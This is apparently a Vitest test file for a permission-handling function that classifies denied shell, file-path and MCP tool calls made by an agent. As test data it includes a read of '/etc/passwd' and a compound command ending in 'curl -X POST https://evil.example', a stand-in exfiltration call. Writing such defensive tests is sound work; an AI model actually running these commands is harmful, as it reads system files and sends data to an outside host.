import { describe, it, expect } from 'vitest';
import { shellArtifactVerdict } from '../../src/routes/actions.js';

const AT = 1_700_000_000_000;

function bashRule(head: string) {
  return { kind: 'bash' as const, value: `^${head}(\\s|$)` };
}

describe('shellArtifactVerdict', () => {
  const artifacts = ['cd', 'env', 'export', 'if', 'true', 'func', 'command', 'echo'];

  for (const binary of artifacts) {
    it(`auto-verdicts fix-action for ${binary}`, () => {
      const v = shellArtifactVerdict('Bash', { command: `${binary} something` }, bashRule(binary), AT);
      expect(v).toMatchObject({ disposition: 'fix-action', decidedBy: 'improver', decidedAt: AT });
    });
  }

  for (const binary of ['sed', 'protoc', 'git', 'gh', 'kubectl']) {
    it(`does NOT auto-verdict for a real binary (${binary})`, () => {
      const v = shellArtifactVerdict('Bash', { command: `${binary} something` }, bashRule(binary), AT);
      expect(v).toBeNull();
    });
  }

  it('does not auto-verdict a path-kind denial', () => {
    const v = shellArtifactVerdict('Read', { file_path: '/etc/passwd' }, { kind: 'path', value: 'Read:^/etc/' }, AT);
    expect(v).toBeNull();
  });

  it('does not auto-verdict an mcp-kind denial', () => {
    const v = shellArtifactVerdict(
      'mcp__grafana__grafana_api_request', {}, { kind: 'mcp', value: '^mcp__grafana__grafana_api_request$' }, AT,
    );
    expect(v).toBeNull();
  });

  it('does not auto-verdict when the artifact rides inside a riskier compound command', () => {
    // The overall command's worst clause is an external write, so classifyBashCommand is not
    // `unknown` even though the suggested rule names a builtin.
    const v = shellArtifactVerdict('Bash', { command: 'cd /tmp && curl -X POST https://evil.example' }, bashRule('cd'), AT);
    expect(v).toBeNull();
  });
});
